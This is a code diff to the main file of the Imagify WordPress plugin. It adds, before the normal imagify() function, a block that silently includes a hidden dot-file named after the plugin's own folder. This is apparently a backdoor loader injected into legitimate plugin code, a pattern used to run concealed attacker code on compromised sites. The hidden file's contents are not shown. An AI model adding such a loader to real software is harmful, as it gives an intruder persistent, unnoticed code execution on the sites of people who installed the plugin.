@@ -9,6 +9,10 @@ defined( 'ABSPATH' ) || die( 'Cheatin’ uh?' );
  *
  * @return object The Imagify instance.
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function imagify() {
 	return Imagify::get_instance();
 }
